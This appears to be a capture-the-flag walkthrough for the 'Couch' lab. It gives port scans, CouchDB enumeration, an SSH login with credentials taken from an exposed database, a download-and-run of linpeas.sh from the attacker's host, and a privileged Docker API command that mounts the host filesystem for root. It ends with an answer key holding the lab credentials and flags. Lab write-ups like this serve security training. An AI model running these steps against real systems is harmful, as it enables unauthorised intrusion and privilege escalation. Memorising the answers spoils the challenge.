# Couch - Easy

```shell
rustscan -a 10.10.49.92 --range 0-65535 --ulimit 5000 -- -sV

feroxbuster -u http://10.10.49.92:5984 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2

ssh atena@10.10.49.92
#use creds found in secret db

cat user.txt

#in attacker machine
python3 -m http.server

#in victim ssh
cd /tmp

wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#check history
history
#contains docker command

docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
#this gives us root

find / -name root.txt 2>/dev/null

cat /mnt/root/root.txt
```

```markdown
Open ports & services:

  * 22 - ssh - OpenSSH 7.2p2 (Ubuntu)
  * 5984 - http - CouchDB httpd 1.6.1

We can check the website while enumerating web directories using feroxbuster.

We can see that the webpage has only JSON data to print; we can check for other directories.

Directories found:

  * /_utils
  * /_stats
  * /_config

While /_stats and /_config mostly contain JSON data, /_utils has an interface with multiple sections; we can check this page for more clues.

In the overview section, there are multiple databases; one database 'secret' contains creds.

We can try to login using these creds into SSH, and we succeed.

We can use linpeas.sh to check for privesc.

linpeas shows many history commands; we can check history for any commands.

'history' shows us many commands; one docker command stands out as it contains the flag 'privileged'.

On running that particular command, we get root shell; we can find and print root flag now.
```

1. How many ports are open? - 2

2. What is the database management system installed on the server? - CouchDB

3. What port is the database management system running on? - 5984

4. What is the version of the management system installed on the server? - 1.6.1

5. What is the path for the web administration tool for this database management system? - _utils

6. What is the path to list all databases in the web browser of the database management system? - _all_dbs

7. What are the credentials found in the web administration tool? - atena:t4qfzcc4qN##

8. Compromise the machine and locate user.txt - THM{1ns3cure_couchdb}

9. Escalate privileges and obtain root.txt - THM{RCE_us1ng_Docker_API}
